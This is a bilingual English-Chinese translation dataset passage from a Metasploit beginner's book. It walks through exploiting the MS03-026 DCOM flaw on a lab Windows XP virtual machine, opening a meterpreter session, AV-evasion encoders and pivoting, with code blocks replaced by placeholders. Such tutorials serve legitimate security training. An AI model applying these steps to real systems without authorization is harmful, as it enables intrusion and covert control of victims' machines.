- en: Chapter 1. Instant Metasploit Starter
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 第1章. 快速入门Metasploit
- en: 'Welcome to *Instant Metasploit Starter*. This book has been especially created
    to provide you with all the information that you need to get set up with Metasploit.
    You will learn the basics of Metasploit, get started with your first successful
    exploit, and discover some tips and tricks for using Metasploit. This Starter
    guide contains the following sections:'
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 欢迎阅读《快速入门Metasploit》。本书特别为您提供了设置Metasploit所需的所有信息。您将学习Metasploit的基础知识，开始您的第一个成功利用，并发现一些使用Metasploit的技巧。这本入门指南包含以下部分：
- en: '*So, what is Metasploit* explains what Metasploit actually is, what you can
    do with it, and why it’s so great.'
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 《那么，Metasploit是什么》解释了Metasploit实际上是什么，你可以用它做什么，以及为什么它如此伟大。
- en: '*Installation* explains how to download and install Metasploit with minimum
    effort. You will also learn how to set it up in no time at all.'
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: '*安装*解释了如何下载和安装Metasploit，最小的努力。您还将学习如何在短时间内设置它。'
- en: '*Quick start – your first exploitation* will show you how to perform one of
    the core tasks of Metasploit; that is, creating your attacks and then exploiting
    the target. Follow the steps to exploit a target, which will be the basis of most
    of your work in Metasploit.'
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: '*快速开始-您的第一个利用*将向您展示如何执行Metasploit的核心任务之一，即创建您的攻击，然后利用目标。按照步骤利用目标，这将成为您在Metasploit中大部分工作的基础。'
- en: '*Top features you need to know about* will explain how to perform five tasks
    with the most important features of Metasploit. By the end of this section, you
    will be able to exploit a vulnerable system and perform post exploitation tasks
    with ease.'
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: '*您需要了解的顶级功能*将解释如何使用Metasploit的最重要功能执行五项任务。在本节结束时，您将能够轻松利用有漏洞的系统并执行后期利用任务。'
- en: '*People and places you should get to know* provides you with many useful links
    to the project page and forums, as well as a number of helpful articles, tutorials,
    blogs, and the Twitter feeds of Metasploit super-contributors.'
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
  zh: '*您应该了解的人和地方*为您提供了许多有用的链接到项目页面和论坛，以及许多有用的文章、教程、博客，以及Metasploit超级贡献者的Twitter动态。'
- en: So, what is Metasploit?
  id: totrans-7
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 那么，Metasploit是什么？
- en: 'This section outlines the need for a framework such as Metasploit in a penetration
    tester''s arsenal. But before we dive into the framework, let''s understand how
    the framework has evolved. The following are some basic concepts that will be
    frequently used in this book:'
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 本节概述了渗透测试人员工具箱中Metasploit这样的框架的必要性。但在我们深入了解框架之前，让我们先了解框架是如何发展的。以下是本书中经常使用的一些基本概念：
- en: '**Vulnerability**: In simple terms, vulnerability is a loophole in the system.
    It acts as a channel for an attacker to penetrate the system, which in other words
    is called exploitation.'
  id: totrans-9
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**漏洞**：简单来说，漏洞是系统中的一个漏洞。它作为攻击者渗透系统的通道，换句话说就是利用。'
- en: '**Exploit**: I would recursively define this term as any working piece of code
    that is used to exploit a vulnerable system.'
  id: totrans-10
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**利用**：我会递归地定义这个术语，即用于利用有漏洞系统的任何有效代码片段。'
- en: '**Payload**: An attacker exploits a system with a purpose. So, after a successful
    exploit whatever he/she intends to do with the system stands for payload. In other
    words, the payload is any working piece of code bundled with an exploit to aid
    the attacker in the post-exploitation phase.'
  id: totrans-11
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**有效载荷**：攻击者利用系统是有目的的。因此，成功利用后，他/她打算对系统做什么就是有效载荷。换句话说，有效载荷是与利用捆绑在一起的任何有效代码片段，以帮助攻击者在后期利用阶段。'
- en: I have defined these terms right at the beginning because these terms will be
    used very often throughout this book.
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 我在一开始就定义了这些术语，因为这些术语将在本书中经常使用。
- en: In the IT industry, we have various flavors of operating systems ranging from
    Mac, Windows, *nix platforms, and other server operating systems, which run an
    *n* number of services depending on the needs of the organization. When given
    a task to assess the risk factor of any organization, it becomes very tedious
    to run single code snippets against these systems. What if, due to some hardware
    failure, all these code snippets are lost? Enter Metasploit.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 在IT行业中，我们有各种各样的操作系统，从Mac、Windows、*nix平台，到其他服务器操作系统，根据组织的需求运行着许多服务。当给定一个评估任何组织风险因素的任务时，针对这些系统运行单个代码片段变得非常繁琐。如果由于某种硬件故障，所有这些代码片段都丢失了怎么办？Metasploit登场。
- en: '![So, what is Metasploit?](img/4483OT_01_01.jpg)'
  id: totrans-14
  prefs: []
  type: TYPE_IMG
  zh: '![那么，Metasploit是什么？](img/4483OT_01_01.jpg)'
- en: Metasploit is an exploit development framework started by H. D. Moore in 2003,
    which was later acquired by Rapid7\. It is basically a tool for the development
    of exploits and the testing of these exploits on live targets. This framework
    has been completely written using Ruby, and is currently one of the largest frameworks
    ever written in the Ruby language. The tool houses more than 800 exploits in its
    repository and hundreds of payloads for each exploit. This also contains various
    encoders, which help us in the obfuscation of exploits to evade the antivirus
    and other **intrusion detection systems** (**IDS**). As we progress in this book,
    we shall uncover more and more features of this tool.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit是一个由H.D. Moore于2003年创建的利用开发框架，后来被Rapid7收购。它基本上是一个用于开发利用并在活动目标上测试这些利用的工具。这个框架完全使用Ruby编写，目前是Ruby语言中编写的最大的框架之一。该工具库中包含800多个利用和每个利用的数百个有效载荷。它还包含各种编码器，可以帮助我们对利用进行混淆，以逃避杀毒软件和其他入侵检测系统（IDS）。随着我们在本书中的进展，我们将揭示这个工具的更多特性。
- en: This tool can be used for penetration testing, risk assessment, vulnerability
    research, and other security developmental practices such as IDS and the **intrusion
    prevention system** (**IPS**).
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 这个工具可以用于渗透测试、风险评估、漏洞研究，以及其他安全开发实践，比如入侵检测系统（IDS）和入侵预防系统（IPS）。
- en: Installation
  id: totrans-17
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 安装
- en: In the previous section, we had a brief introduction to the Metasploit framework.
    In this section, we will learn about the system requirements and various modes
    of installation of the Metasploit framework.
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 在前一部分，我们简要介绍了Metasploit框架。在这一部分，我们将了解Metasploit框架的系统要求和各种安装模式。
- en: 'The easiest way to get your hands on Metasploit is to download the Linux distribution
    named Backtrack. Backtrack is a Linux-based security distribution that comes with
    built-in hacker tools. These tools range from information gathering to cyber forensics.
    The Metasploit framework comes under the network exploitation category. Backtrack
    includes this within itself to be used just out of the box. Let''s see how to
    do this:'
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 获取Metasploit的最简单方法是下载名为Backtrack的Linux发行版。Backtrack是一个基于Linux的安全发行版，内置了黑客工具。这些工具从信息收集到网络取证都有。Metasploit框架属于网络利用类别。Backtrack将其包含在内，可以直接使用。让我们看看如何做到这一点：
- en: Visit the site [http://www.backtrack-linux.org](http://www.backtrack-linux.org).
    Under the **Downloads** section of the site, download the latest version of Backtrack
    onto your system. Here, you have the option of choosing an ISO image or a VMware
    image. Choose the required image based on your needs and allow the download to
    complete.
  id: totrans-20
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 访问网站[http://www.backtrack-linux.org](http://www.backtrack-linux.org)。在该网站的**下载**部分，下载最新版本的Backtrack到你的系统上。在这里，你可以选择ISO镜像或VMware镜像。根据你的需求选择所需的镜像，并允许下载完成。
- en: Use a Virtual Workstation such as VMware or Virtual Box to open the image and
    let the operating system load. The login credentials by default are `root`:`toor`.![Installation](img/4483OT_02_01.jpg)
  id: totrans-21
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 使用虚拟工作站，如VMware或Virtual Box打开镜像，让操作系统加载。默认情况下登录凭据是`root`:`toor`。![安装](img/4483OT_02_01.jpg)
- en: Once you get the shell prompt, type `startx` to load the GUI of the system.
    The following screenshot shows the look of the GUI of Backtrack 5:![Installation](img/4483OT_02_02.jpg)
  id: totrans-22
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦你得到了shell提示，输入`startx`来加载系统的GUI。下面的截图显示了Backtrack 5的GUI的外观：![安装](img/4483OT_02_02.jpg)
- en: Metasploit comes in various flavors. In this section, we shall see how to invoke
    the Metasploit framework through the command-line console.
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit有各种不同的版本。在这一部分，我们将看到如何通过命令行控制台调用Metasploit框架。
- en: In your Backtrack system, open the shell by clicking on the terminal icon as
    shown in the following screenshot:![Installation](img/4483OT_02_03.jpg)
  id: totrans-24
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在你的Backtrack系统中，点击终端图标打开shell，如下面的截图所示：![安装](img/4483OT_02_03.jpg)
- en: Once the terminal is opened, type the `root@bt:~# msfconsole` command:![Installation](img/4483OT_02_04.jpg)
  id: totrans-25
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦终端打开，输入`root@bt:~# msfconsole`命令：![安装](img/4483OT_02_04.jpg)
- en: As shown in the preceding screenshot, we have successfully launched `msfconsole`.
    The screenshot describes the version of the framework currently installed on the
    system. Here, it is Metasploit 4.5.
  id: totrans-26
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如前面的截图所示，我们已经成功启动了`msfconsole`。截图描述了当前安装在系统上的框架版本。在这里，它是Metasploit 4.5。
- en: Metasploit is located in the `/opt/metasploit/msf3` folder under Backtrack 5
    R3\. As you can see, under this folder we have the `msfconsole` executable.![Installation](img/4483OT_02_05.jpg)
  id: totrans-27
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Metasploit位于Backtrack 5 R3的`/opt/metasploit/msf3`文件夹下。如你所见，在这个文件夹下我们有`msfconsole`可执行文件。![安装](img/4483OT_02_05.jpg)
- en: Metasploit not only comes with a command-line interface, but it has a very user
    friendly GUI called **Armitage**. Armitage is a tool for Metasploit, which is
    used to visualize targets and intelligently recommends exploits that are based
    on the target's nature. In this section, we shall see how to launch Armitage in
    Backtrack.
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit不仅配备了一个命令行界面，而且还有一个非常用户友好的GUI叫做**Armitage**。Armitage是Metasploit的一个工具，用于可视化目标并智能推荐基于目标性质的漏洞利用。在这一部分，我们将看到如何在Backtrack中启动Armitage。
- en: 'Navigate to Armitage: **Applications** | **Backtrack** |**Exploitation Tools**
    | **Network Exploitation Tools** | **Metasploit Framework** | **armitage**:![Installation](img/4483OT_02_06.jpg)'
  id: totrans-29
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 导航到Armitage：**应用程序** | **Backtrack** |**利用工具** | **网络利用工具** | **Metasploit框架**
    | **armitage**：![安装](img/4483OT_02_06.jpg)
- en: You will be prompted with a dialog box. Click on **OK** and wait till Armitage
    loads on your GUI. Do not change any values in the dialog box. This may take quite
    some time to load, which is expected.
  id: totrans-30
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 你将会看到一个对话框。点击**确定**，等待Armitage加载到你的GUI上。不要改变对话框中的任何值。这可能需要相当长的时间来加载，这是预期的。
- en: In the following screenshot, you can see what Armitage—the GUI for Metasploit—looks
    like. In the subsequent chapters, we will cover how to use the command-line interface
    of Metasploit as well as the Armitage GUI for performing attacks.![Installation](img/4483OT_02_07.jpg)
  id: totrans-31
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在下面的截图中，你可以看到Armitage——Metasploit的GUI的样子。在接下来的章节中，我们将介绍如何使用Metasploit的命令行界面以及Armitage
    GUI来执行攻击。![安装](img/4483OT_02_07.jpg)
- en: In the preceding screenshot, the upper half of the screen shows the folder structure
    of the Metasploit framework. The lower half of the screen shows the console of
    the framework integrated with the GUI. We shall see how to use it in the upcoming
    chapters.
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 在前面的截图中，屏幕的上半部分显示了Metasploit框架的文件夹结构。屏幕的下半部分显示了与GUI集成的框架的控制台。我们将在接下来的章节中看到如何使用它。
- en: Quick start – your first exploitation!
  id: totrans-33
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 快速开始——你的第一个利用！
- en: 'In the *So, what is Metasploit?* section we have learned about the evolution
    of this tool, and in the *Installation* section, we learned the quickest and the
    easiest way to get your hands on this powerful exploit development framework.
    Now that you have Metaspoit up and running, it''s time to get your hands dirty
    with your first hands-on section. In this section, we shall exploit a vulnerable
    Windows machine through the following two methods:'
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 在*那么，什么是Metasploit？*部分，我们已经了解了这个工具的演变，在*安装*部分，我们学习了获取这个强大的漏洞利用开发框架的最快最简单的方法。现在你已经安装并运行了Metaspoit，是时候动手进行第一个实践部分了。在这一部分，我们将通过以下两种方法利用一个有漏洞的Windows机器：
- en: Exploitation using the Metasploit command-line interface
  id: totrans-35
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用Metasploit命令行界面进行利用
- en: Exploitation using the Metasploit GUI – Armitage
  id: totrans-36
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用Metasploit GUI – Armitage进行利用
- en: Step 1 – the command-line exploitation
  id: totrans-37
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 步骤1 - 命令行利用
- en: 'Load backtrack 5 OS in your virtual machine, and open the terminal. In the
    terminal execute the following command:'
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 在你的虚拟机中加载backtrack 5操作系统，并打开终端。在终端中执行以下命令：
- en: '[PRE0]'
  id: totrans-39
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: 'The `msfconsole` command brings up the command-line interface of Metasploit
    as shown in the following screenshot:'
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: '`msfconsole`命令会打开Metasploit的命令行界面，如下面的截图所示：'
- en: '![Step 1 – the command-line exploitation](img/4483OT_03_01.jpg)'
  id: totrans-41
  prefs: []
  type: TYPE_IMG
  zh: '![步骤1 - 命令行利用](img/4483OT_03_01.jpg)'
- en: 'Along with Backtrack, I am running a vulnerable Windows machine in my virtual
    machine workstation. Let me define the two roles:'
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 除了Backtrack，我在我的虚拟机工作站上运行了一个易受攻击的Windows机器。让我定义一下这两个角色：
- en: '**Attacker**: The Backtrack instance of the virtual machine is the attacker,
    and Metasploit is our attacking tool'
  id: totrans-43
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 攻击者：虚拟机中的Backtrack实例是攻击者，Metasploit是我们的攻击工具
- en: '**Victim**: An instance of a Windows XP vulnerable machine running on the virtual
    machine is the victim'
  id: totrans-44
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 受害者：运行在虚拟机上的Windows XP易受攻击机器是受害者
- en: 'It''s a well-known issue that Windows XP based systems had a vulnerable RPC
    DCOM component and it was susceptible to overflow attacks. In order to search
    for this exploit in the `metasploit` repository, we shall run the following command
    in the `msf-terminal`:'
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 众所周知，基于Windows XP的系统存在一个易受攻击的RPC DCOM组件，容易受到溢出攻击。为了在`metasploit`存储库中搜索这个漏洞，我们将在`msf-terminal`中运行以下命令：
- en: '[PRE1]'
  id: totrans-46
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'The `search dcom` command searches for all exploits whose name contains a substring
    called `dcom`. The following screenshot shows the result of this search:'
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: '`search dcom`命令搜索所有名称中包含`dcom`子字符串的漏洞。以下截图显示了这次搜索的结果：'
- en: '![Step 1 – the command-line exploitation](img/4483OT_03_02.jpg)'
  id: totrans-48
  prefs: []
  type: TYPE_IMG
  zh: '![步骤1 - 命令行利用](img/4483OT_03_02.jpg)'
- en: 'In the result, we see an entry named `exploit/windows/dcerpc/ms03_026_dcom`.
    The folder structure tells us where on the Metasploit''s folder structure the
    exploit code is present. If we observe the name of the exploit we can see that
    it''s a combination of letters and numbers. The `ms03` stands for the year in
    which the **Common Vulnerabilities and Exposures** (**CVE**) was assigned to the
    exploit, in this case 2003 for Microsoft. After we get the search results, we
    use the following command:'
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 在结果中，我们看到一个名为`exploit/windows/dcerpc/ms03_026_dcom`的条目。文件夹结构告诉我们在Metasploit的文件夹结构中漏洞代码的位置。如果我们观察漏洞的名称，我们可以看到它是字母和数字的组合。`ms03`代表了**通用漏洞和暴露**（**CVE**）分配给漏洞的年份，这种情况下是2003年的Microsoft。在得到搜索结果后，我们使用以下命令：
- en: '[PRE2]'
  id: totrans-50
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: 'This changes the Metasploit general terminal now to exploit a specific terminal.
    Any exploit-specific changes that we wish to do are done in this step. Before
    going ahead in this step, we need to find out what options are available for this
    particular exploit that takes in values from the attacker. The following screenshot
    will be used for explanation:'
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 这将把Metasploit的一般终端改为利用特定终端。我们希望进行的任何特定于漏洞的更改都是在这一步完成的。在进行这一步之前，我们需要找出这个特定漏洞的可用选项。以下截图将用于解释：
- en: '![Step 1 – the command-line exploitation](img/4483OT_03_03.jpg)'
  id: totrans-52
  prefs: []
  type: TYPE_IMG
  zh: '![步骤1 - 命令行利用](img/4483OT_03_03.jpg)'
- en: 'You can see in the preceding screenshot that I have used the following command:'
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以在上面的截图中看到我使用了以下命令：
- en: '[PRE3]'
  id: totrans-54
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: 'The `show options` command shows all the available options for the exploit.
    Here, the **RPORT** (target port) is by default set to the default port of the
    RPC that is running on the Windows system. But, **RHOST** (target host) requires
    us to input the IP address of the victim. I know the IP address of my victim to
    be 192.168.252.132\. I provide these details to Metasploit by using the `set RHOST
    ipaddress` command:'
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: '`show options`命令显示了漏洞的所有可用选项。在这里，**RPORT**（目标端口）默认设置为运行在Windows系统上的RPC的默认端口。但是，**RHOST**（目标主机）需要我们输入受害者的IP地址。我知道我的受害者的IP地址是192.168.252.132。我通过使用`set
    RHOST ipaddress`命令将这些详细信息提供给Metasploit：'
- en: '[PRE4]'
  id: totrans-56
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: 'Following this, you can perform the `show options` command to see the values
    and confirm them. After doing all these, let''s execute the `exploit` command
    as follows:'
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 在此之后，你可以执行`show options`命令来查看值并确认它们。在做完所有这些之后，让我们执行`exploit`命令，如下所示：
- en: '[PRE5]'
  id: totrans-58
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: 'In the following screenshot, we see the exploit is successful in opening a
    `meterpreter` session with the victim:'
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 在下面的截图中，我们看到利用成功地打开了一个与受害者的`meterpreter`会话：
- en: '![Step 1 – the command-line exploitation](img/4483OT_03_04.jpg)'
  id: totrans-60
  prefs: []
  type: TYPE_IMG
  zh: '![步骤1 - 命令行利用](img/4483OT_03_04.jpg)'
- en: The meterpreter session is nothing but a communication channel for the attacker
    to perform his/her post exploitation actions without the knowledge of the victim.
    More on this topic will be covered in detail in the *The meterpreter module* section.
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: '`meterpreter`会话只是攻击者进行后期利用操作的通信渠道，而受害者并不知情。关于这个主题的更多内容将在*The meterpreter module*部分详细介绍。'
- en: Now that we have successfully exploited the vulnerable XP system using this
    simple exploit, let's understand how to perform a similar attack on the GUI-based
    Armitage framework.
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经成功利用了这个简单的漏洞来攻击易受攻击的XP系统，让我们了解如何在基于GUI的Armitage框架上执行类似的攻击。
- en: Step 2 – GUI-based exploitation
  id: totrans-63
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 步骤2 - 基于GUI的利用
- en: 'We load the Armitage framework as explained in the *Installation* section.
    After finding the CVE number of the exploit, we just searched for it at the search
    input as shown in the following screenshot:'
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 我们按照*安装*部分的说明加载了Armitage框架。在找到漏洞的CVE编号后，我们只需在搜索输入框中搜索它，如下面的截图所示：
- en: '![Step 2 – GUI-based exploitation](img/4483OT_03_05.jpg)'
  id: totrans-65
  prefs: []
  type: TYPE_IMG
  zh: '![步骤2 - 基于GUI的利用](img/4483OT_03_05.jpg)'
- en: Double-click on the exploit. The attack settings can be set there on the UI,
    unlike running a command as shown in the previous section. Enter the RHOST value
    in the field on the UI, and check the **Use reverse connection** box. Now, click
    on the **Launch** button to perform the attack.
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: 双击漏洞。攻击设置可以在UI上进行，不像在上一节中运行命令。在UI上的字段中输入RHOST值，并勾选**使用反向连接**框。现在，点击**启动**按钮执行攻击。
- en: '![Step 2 – GUI-based exploitation](img/4483OT_03_06.jpg)'
  id: totrans-67
  prefs: []
  type: TYPE_IMG
  zh: '![步骤2 - 基于GUI的利用](img/4483OT_03_06.jpg)'
- en: The following screenshot shows that it has successfully completed the attack,
    and you can see the difference in the UI around the 192.xx.xx.132 system. You
    can also see that the meterpreter session has been opened in the same way as using
    the command-line exploitation method.
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 以下截图显示它已成功完成了攻击，并且您可以看到围绕192.xx.xx.132系统的UI的差异。您还可以看到meterpreter会话已以与使用命令行利用方法相同的方式打开。
- en: With this we are good to go ahead to more advanced topics and few scenario-based
    attacks from the subsequent sections. The meterpreter in itself will be covered
    explicitly in a complete section, and Armitage will be covered as a separate section
    as well. The *Quick start – your first exploitation* section is written to give
    you a teaser into this exploitation framework.
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 有了这个，我们可以继续更深入的主题和一些基于场景的攻击。Meterpreter本身将在一个完整的部分中详细介绍，Armitage也将作为一个单独的部分进行介绍。*快速入门-您的第一个利用*部分是为了给您一个对这个利用框架的预演。
- en: Top features you need to know about
  id: totrans-70
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 您需要了解的顶级功能
- en: 'After learning about the basics of the Metasploit framework, in this section
    we will find out the top features of Metasploit and learn some of the attack scenarios.
    This section will be a flow of the following features:'
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 在学习了Metasploit框架的基础知识之后，在本节中我们将了解Metasploit的顶级功能，并学习一些攻击场景。本节将是以下功能的流程：
- en: The meterpreter module
  id: totrans-72
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Meterpreter模块
- en: Using auxiliary modules in Metasploit
  id: totrans-73
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用Metasploit中的辅助模块
- en: Client-side attacks with auxiliary modules
  id: totrans-74
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用辅助模块进行客户端攻击
- en: The meterpreter module
  id: totrans-75
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Meterpreter模块
- en: 'In the earlier sections, we have seen how to open up a meterpreter session
    in Metasploit. But in this section, we shall see the features of the `meterpreter`
    module and its command set in detail. Before we see the working example, let''s
    see why meterpreter is used in exploitation:'
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 在之前的部分中，我们已经看到了如何在Metasploit中打开一个meterpreter会话。但在本节中，我们将详细了解`meterpreter`模块及其命令集的特性。在看到工作示例之前，让我们看看为什么在利用中使用meterpreter：
- en: It doesn't create a new process in the target system
  id: totrans-77
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 它不会在目标系统中创建新进程
- en: It runs in the context of the process that is being exploited
  id: totrans-78
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 它在被利用的进程的上下文中运行
- en: It performs multiple tasks in one go; that is, you don't have to create separate
    requests for each individual task
  id: totrans-79
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 它可以一次执行多个任务；也就是说，您不必为每个单独的任务创建单独的请求
- en: It supports scripts writing
  id: totrans-80
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 它支持脚本编写
- en: As seen in the *Quick start – your first exploitation* section, let's check
    out what the meterpreter shell looks like. Meterpreter allows you to provide commands
    and obtain results.
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 正如在*快速入门-您的第一个利用*部分中所看到的，让我们来看看meterpreter shell是什么样子的。Meterpreter允许您提供命令并获取结果。
- en: '![The meterpreter module](img/4483OT_04_01.jpg)'
  id: totrans-82
  prefs: []
  type: TYPE_IMG
  zh: '![The meterpreter module](img/4483OT_04_01.jpg)'
- en: Let's see the list of commands that are available to use under meterpreter.
    These can be obtained by typing `help` in the meterpreter command shell.
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们看看在meterpreter下可用的命令列表。这些可以通过在meterpreter命令shell中键入`help`来获得。
- en: 'The syntax for this command is as follows:'
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 此命令的语法如下：
- en: '[PRE6]'
  id: totrans-85
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: 'The following screenshot represents the core commands:'
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 以下截图代表核心命令：
- en: '![The meterpreter module](img/4483OT_04_02.jpg)'
  id: totrans-87
  prefs: []
  type: TYPE_IMG
  zh: '![The meterpreter module](img/4483OT_04_02.jpg)'
- en: 'The filesystem commands are as follows:'
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 文件系统命令如下：
- en: '![The meterpreter module](img/4483OT_04_03.jpg)'
  id: totrans-89
  prefs: []
  type: TYPE_IMG
  zh: '![The meterpreter module](img/4483OT_04_03.jpg)'
- en: 'The networking commands are as follows:'
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 网络命令如下：
- en: '![The meterpreter module](img/4483OT_04_04.jpg)'
  id: totrans-91
  prefs: []
  type: TYPE_IMG
  zh: '![The meterpreter module](img/4483OT_04_04.jpg)'
- en: 'The system commands are as follows:'
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 系统命令如下：
- en: '![The meterpreter module](img/4483OT_04_05.jpg)'
  id: totrans-93
  prefs: []
  type: TYPE_IMG
  zh: '![The meterpreter module](img/4483OT_04_05.jpg)'
- en: 'The user interface commands are as follows:'
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 用户界面命令如下：
- en: '![The meterpreter module](img/4483OT_04_06.jpg)'
  id: totrans-95
  prefs: []
  type: TYPE_IMG
  zh: '![The meterpreter module](img/4483OT_04_06.jpg)'
- en: 'The other miscellaneous commands are as follows:'
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 其他杂项命令如下：
- en: '![The meterpreter module](img/4483OT_04_07.jpg)'
  id: totrans-97
  prefs: []
  type: TYPE_IMG
  zh: '![The meterpreter module](img/4483OT_04_07.jpg)'
- en: 'As you can see in the preceding screenshots, meterpreter has two sets of commands
    set apart from its core set of commands. They are as follows:'
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 正如您在前面的截图中所看到的，meterpreter除了其核心命令集之外，还有两套命令集。它们如下：
- en: '`Stdapi`'
  id: totrans-99
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Stdapi`'
- en: '`Priv`'
  id: totrans-100
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Priv`'
- en: The `Stdapi` command set contains various commands for the filesystem commands,
    networking commands, system commands, and user-interface commands. Depending on
    the exploit, if it can get higher privileges, the `priv` command set is loaded.
    By default, the `stdapi` command set and `core` command set gets loaded irrespective
    of the privilege an exploit gets.
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: '`Stdapi`命令集包含各种文件系统命令、网络命令、系统命令和用户界面命令。根据利用的情况，如果可以获得更高的特权，将加载`priv`命令集。默认情况下，无论利用者获得的特权如何，都会加载`stdapi`命令集和`core`命令集。'
- en: Let's check out the route command from the meterpreter `stdapi` command set.
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们来看看来自meterpreter `stdapi`命令集的路由命令。
- en: 'The syntax is as follows:'
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 语法如下：
- en: '[PRE7]'
  id: totrans-104
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: 'In the following screenshot, we can see the list of all the routes on the target
    machine:'
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: 在下面的截图中，我们可以看到目标机器上所有路由的列表：
- en: '![The meterpreter module](img/4483OT_04_09.jpg)'
  id: totrans-106
  prefs: []
  type: TYPE_IMG
  zh: '![The meterpreter module](img/4483OT_04_09.jpg)'
- en: 'In a scenario where we wish to add other subnets and gateways we can use the
    concept of pivoting, where we add a couple of routes for optimizing the attack.
    The following are the commands supported by the route:'
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
